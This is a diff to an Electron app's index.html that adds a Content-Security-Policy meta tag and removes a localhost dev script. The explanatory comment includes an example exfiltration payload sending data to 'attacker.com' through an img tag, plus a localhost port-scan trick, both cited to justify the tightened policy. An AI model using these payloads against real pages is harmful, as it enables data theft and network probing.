@@ -5,13 +5,48 @@
     <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <meta name="color-scheme" content="dark" />
+    <!--
+      CSP: single policy that covers both browser/Electron dev and packaged.
+
+      The packaged renderer loads from file:// — Electron does not fire
+      session.webRequest.onHeadersReceived for local file loads, so
+      response-header CSP is not available for the initial document. The
+      meta tag is the primary defence, layered under the sandbox +
+      contextIsolation + navigation-protocol allowlist in main.ts. A
+      header-based CSP would only add value if the renderer moved to a
+      registered custom protocol (e.g. `app://`) that goes through
+      Electron's protocol handler pipeline — deferred to a later phase.
+
+      - 'unsafe-eval' is unavoidable — Vite HMR uses eval() and Three.js does
+        function generation for shaders. Electron will emit a dev-only warning
+        about this; it doesn't fire in packaged builds.
+      - connect-src whitelist:
+          * 'self' + file:// for packaged renderer, http://localhost:5173 +
+            ws://localhost:5173 for Vite dev.
+          * http://127.0.0.1:* for the local Go backend (OS-assigned port in
+            packaged mode).
+          * blob: because Three.js's GLTFLoader fetches embedded textures via
+            blob URLs, and connect-src gates those.
+          * https://raw.githubusercontent.com is where drei's <Environment>
+            actually resolves HDR presets from (the drei-assets repo on
+            GitHub). raw.githack.com stays in the list because drei has
+            historically pointed at both — kept as a fallback in case
+            they switch back or use it for cache-busted variants.
+      - img-src is scoped to the olx.bg image CDN (apollo.olxcdn.com and
+        regional siblings like frankfurt.apollo.olxcdn.com), plus data:
+        for inline SVG icons. Previously this was `https:` blanket, which
+        turned every renderer-XSS candidate into a data-exfil channel —
+        `<img src="https://attacker.com/?leak=...">` would just work.
+        The narrower list also blocks browser-based localhost port scans
+        via `<img src="https://127.0.0.1:PORT">` tricks.
+      - style-src 'unsafe-inline' is Tailwind's runtime injected styles —
+        Tailwind doesn't ship nonces yet.
+    -->
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; connect-src 'self' blob: http://127.0.0.1:* http://localhost:5173 ws://localhost:5173 https://raw.githubusercontent.com https://raw.githack.com; img-src 'self' data: https://*.olxcdn.com; font-src 'self' data:;" />
     <title>the great find</title>
   </head>
   <body class="h-full antialiased">
     <div id="root" class="h-full"></div>
     <script type="module" src="/src/main.tsx"></script>
-  <!-- impeccable-live-start -->
-<script src="http://localhost:8400/live.js"></script>
-<!-- impeccable-live-end -->
-</body>
+  </body>
 </html>
